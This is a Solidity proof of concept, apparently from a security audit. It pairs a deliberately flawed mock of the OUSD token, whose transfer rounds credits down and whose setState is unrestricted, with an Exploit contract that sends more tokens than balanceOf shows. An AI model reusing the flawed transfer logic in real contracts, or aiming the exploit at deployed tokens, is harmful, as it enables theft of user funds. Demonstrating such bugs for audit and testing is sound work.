// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract OUSD {
    mapping(address => uint256) public creditBalances;
    uint256 public creditsPerToken;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function setState(address account, uint256 credits, uint256 cpt) external {
        creditBalances[account] = credits;
        creditsPerToken = cpt;
    }

    function balanceOf(address account) public view returns (uint256) {
        return creditBalances[account] * 1e18 / creditsPerToken;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        // @> creditsDeducted rounds down instead of checking the token balance first.
        uint256 creditsDeducted = value * creditsPerToken / 1e18;
        creditBalances[msg.sender] -= creditsDeducted;
        emit Transfer(msg.sender, to, value);
        return true;
    }
}

contract Exploit {
    event Proof(uint256 visibleBalance, uint256 transferred, uint256 remainingCredits);
    function run() external {
        OUSD token = new OUSD();
        token.setState(address(this), 1, 5e17); // visible balance floors to 2 tokens
        uint256 before = token.balanceOf(address(this));
        token.transfer(address(0xBEEF), before + 1); // sends 3 while balanceOf reported 2
        emit Proof(before, before + 1, token.creditBalances(address(this)));
        require(before == 2 && token.creditBalances(address(this)) == 0, "rounding exploit not reproduced");
    }
}
